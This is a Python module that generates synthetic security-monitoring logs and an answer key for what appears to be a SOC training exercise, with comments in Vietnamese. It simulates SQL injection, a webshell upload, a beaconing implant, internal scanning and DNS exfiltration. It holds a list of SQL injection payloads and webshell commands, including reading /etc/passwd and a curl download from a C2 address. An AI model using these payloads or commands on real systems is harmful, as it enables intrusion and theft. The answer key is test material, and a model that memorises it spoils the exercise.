#!/usr/bin/env python3
# ============================================================================
# chain.py - chien dich tren web-shop (kich ban Bai 18, muc 5.1 luong B):
#   C1 SQLi thanh cong      ticket (ghi thang)          TP P1  E = octet IP ke tan cong
#   C2 webshell .phtml (FIM) ticket (ghi thang)          TP P1  E = octet IP ke tan cong
#   C3 goi lenh qua webshell KHONG ticket; dong log THAT qua analysisd (luat R-A cua SV no truc tiep)
#   C4 implant beacon 30s    ticket (ghi thang)          TP P1  E = octet IP C2
#   C5 quet noi bo           KHONG ticket; dong log THAT, tron trong bao (luat R-B)
#   C6 exfil DNS             ticket (ghi thang)          TP P1  E = octet IP web-shop (may nguon bi nhiem)
# Ngoai ra: bao ket noi tu may sao luu (CHG), luu luong web hop le (anh + script da duyet).
# ============================================================================
import random
import string

from . import docs
from .cases import R as BASE_R, _alert, netmon, _dns

R = dict(BASE_R)
R.update({
    "web":     ("100150", 3, "Web access log", ["web", "accesslog"]),
    "sqli_ok": ("100151", 12, "SQL injection thanh cong: phan hoi 200 kich thuoc lon toi IP ngoai",
                ["web", "attack", "sql_injection", "soc_web"]),
    "sqli":    ("100153", 6, "SQL injection attempt", ["web", "attack", "sql_injection"]),
    "fim_up":  ("100152", 12, "File thuc thi moi trong thu muc uploads/ cua web", ["syscheck", "soc_web"]),
})
SQLI = ["' OR 1=1--", "1 UNION SELECT NULL,NULL--", "1' AND SLEEP(5)--", "1;DROP TABLE x--", "admin'--"]
CMDS = ["id", "uname -a", "cat /etc/passwd", "ls -la /var/www", "ps aux", "netstat -tnp", "whoami",
        "cat config.php", "find / -name '*.sql'", "curl -s http://%s/k -o /tmp/.k"]
MITRE_CHAIN = {"C1": "T1190", "C2": "T1505.003", "C3": "T1505.003", "C4": "T1071", "C5": "T1046", "C6": "T1048"}
SCAN_PORTS = [22, 445, 3306, 3389, 5432, 80, 8080, 139, 6379, 1433]


def plan(w, rng):
    """Dap an chuoi (P1 deu tren web-shop - muc Cao). INC gan sau (shift.py)."""
    ws = w.ip("web-shop")
    return {
        "C1": {"pattern": "C1", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(w.attacker_ip),
               "noise_ips": [w.new_ext_ip() for _ in range(rng.randint(3, 5))]},
        "C2": {"pattern": "C2", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(w.attacker_ip)},
        "C4": {"pattern": "C4", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(w.c2_ip)},
        "C6": {"pattern": "C6", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(ws)},
        "SC": {"HOST": "web-shop", "GIAI_DOAN": 6, "ASSET_LEVEL": 1, "STAGE": "A", "IOC_C2": w.octet(w.c2_ip),
               "MITRE": sorted({m.split(".")[0][1:] for m in MITRE_CHAIN.values()}), "DE_XUAT": [1, 2, 3, 8]},
    }


# ---------------------------------------------------------------- ticket chuoi (ghi thang)
def render(key, p, ts, w, rng):
    return {"C1": r_C1, "C2": r_C2, "C4": r_C4, "C6": r_C6}[key](p, ts, w, rng)


def _web_doc(ts, host, src, method, url, status, size):
    line = docs.line_web(ts, host, src, method, url, status, size)
    return docs.alert(ts, host, *R["web"][:2], R["web"][2], R["web"][3],
                      data={"srcip": src, "url": url, "id": str(status), "protocol": method},
                      full_log=line, decoder="web-accesslog", program="nginx")


def r_C1(p, ts, w, rng):
    ev = []
    for ip in p["noise_ips"]:                       # ke do tham khac: payload bi chan (403/500)
        for k in range(rng.randint(5, 15)):
            tt = ts - rng.randint(120, 1500)
            u = "/product.php?id=%s" % rng.choice(SQLI).replace(" ", "%20")
            ev.append(docs.alert(tt, "web-shop", *R["sqli"][:2], R["sqli"][2], R["sqli"][3],
                                 data={"srcip": ip, "url": u, "id": rng.choice(["403", "500"])},
                                 full_log=docs.line_web(tt, "web-shop", ip, "GET", u, 403, 312), decoder="web-accesslog"))
    big = []
    for k in range(rng.randint(6, 10)):             # RIENG ke tan cong: 200 voi so byte gap 20-50 lan nen
        tt = ts - rng.randint(10, 300)
        u = "/product.php?id=%s" % rng.choice(SQLI[:2]).replace(" ", "%20")
        size = rng.randint(20, 50) * 2400
        big.append(docs.alert(tt, "web-shop", *R["sqli"][:2], R["sqli"][2], R["sqli"][3],
                              data={"srcip": w.attacker_ip, "url": u, "id": "200"},
                              full_log=docs.line_web(tt, "web-shop", w.attacker_ip, "GET", u, 200, size), decoder="web-accesslog"))
    tk = docs.alert(ts, "web-shop", *R["sqli_ok"][:2], R["sqli_ok"][2], R["sqli_ok"][3],
                    data={"srcip": w.attacker_ip, "url": "/product.php", "id": "200"},
                    full_log=big[-1]["full_log"], decoder="web-accesslog", mitre=["T1190"])
    return tk, ev + big


def r_C2(p, ts, w, rng):
    path = "/var/www/html" + w.upload_dir + w.webshell
    up = _web_doc(ts - rng.randint(3, 20), "web-shop", w.attacker_ip, "POST", "/profile/upload_avatar.php", 200, 128)
    tk = docs.fim(ts, "web-shop", *R["fim_up"][:2], R["fim_up"][2], path, "added", "www-data", mitre=["T1505.003"])
    tk["rule"]["groups"] = R["fim_up"][3] + ["syscheck_entry_added"]
    return tk, [up]


def r_C4(p, ts, w, rng):
    ws = w.ip("web-shop")
    ev = [docs.alert(ts - 600, "web-shop", *R["audit_exec"][:2], R["audit_exec"][2], R["audit_exec"][3],
                     data={"audit": {"exe": "/tmp/.k", "command": "[kworker/u4:2]", "uid": "33"}},
                     full_log="type=EXECVE exe=/tmp/.k uid=33", decoder="auditd")]
    ev += [netmon(ts - 30 * k, "web-shop", w.c2_ip, w.c2_port, "[kworker/u4:2]", ws) for k in range(1, 20)]
    tk = docs.alert(ts, "web-shop", *R["beacon"][:2], R["beacon"][2], R["beacon"][3],
                    data={"srcip": ws, "dstip": w.c2_ip, "dstport": str(w.c2_port), "process": {"name": "[kworker/u4:2]"}},
                    full_log="periodic outbound", decoder="netmon", mitre=["T1071"])
    return tk, ev


def r_C6(p, ts, w, rng):
    ws = w.ip("web-shop")
    ev = [_dns(ts - 900 + k * 4, "web-shop", "%s.%s" % ("".join(rng.choice(string.ascii_lowercase + "234567") for _ in range(rng.randint(45, 60))), w.exfil_domain), ws)
          for k in range(rng.randint(150, 220))]
    tk = docs.alert(ts, "web-shop", *R["dns"][:2], R["dns"][2], R["dns"][3],
                    data={"srcip": ws, "query": "*.%s" % w.exfil_domain}, full_log="dns exfil heuristic",
                    decoder="dnsmasq", mitre=["T1048"])
    return tk, ev


# ---------------------------------------------------------------- dong log THAT (qua analysisd)
def lines_webshell_cmd(ts, w, rng):
    """C3: 1-3 lenh qua webshell, ten tham so DOI LIEN TUC (khong 'cmd=')."""
    out = []
    for k in range(rng.randint(1, 3)):
        c = rng.choice(CMDS)
        if "%s" in c:
            c = c % w.c2_ip
        url = "%s%s?%s=%s" % (w.upload_dir, w.webshell, rng.choice(w.cmd_params), c.replace(" ", "+"))
        out.append(docs.line_web(ts + k, "web-shop", w.attacker_ip, "GET", url, 200, rng.randint(80, 4000)))
    return out


def lines_web_noise(ts, w, rng, n):
    """Khach hang: trang, anh trong uploads/, script DA DUYET trong uploads/ (co query) - KHONG duoc bat."""
    out = []
    for k in range(n):
        ip = "%d.%d.%d.%d" % (rng.choice([14, 27, 42, 113, 116, 171, 222]), rng.randint(1, 254), rng.randint(1, 254), rng.randint(1, 254))
        r = rng.random()
        if r < 0.45:
            url = rng.choice(["/", "/product.php?id=%d" % rng.randint(1, 900), "/cart.php", "/search.php?q=ao+khoac"])
        elif r < 0.8:
            url = "%savatar_%d.%s" % (w.upload_dir, rng.randint(1000, 99999), rng.choice(["png", "jpg", "webp"]))
        else:
            url = "%s%s?w=%d&h=%d&f=avatar_%d.png" % (w.upload_dir, w.approved_script, rng.choice([64, 128, 256]),
                                                      rng.choice([64, 128, 256]), rng.randint(1000, 99999))
        out.append(docs.line_web(ts + k * 0.3, "web-shop", ip, "GET", url, rng.choice([200, 200, 200, 304, 404]), rng.randint(200, 90000)))
    return out


def lines_storm(ts, w, rng, n):
    """Bao: may sao luu (CHG) -> nhieu may chu noi bo, cong agent."""
    targets = [h["ip"] for name, h in w.hosts.items() if not name.startswith(("ws-", "bk-")) and name != "siem"]
    out = []
    for k in range(n):
        src_host = rng.choice(w.backup_hosts)
        out.append(docs.line_conn(ts + k * 0.05, src_host, w.ip(src_host), rng.choice(targets), w.backup_port))
    return out


def lines_scan(ts, w, rng, n):
    """C5: web-shop quet noi bo (nhieu may, nhieu cong)."""
    targets = [h["ip"] for name, h in w.hosts.items() if name not in ("web-shop", "siem")]
    return [docs.line_conn(ts + k * 0.2, "web-shop", w.ip("web-shop"), rng.choice(targets), rng.choice(SCAN_PORTS))
            for k in range(n)]
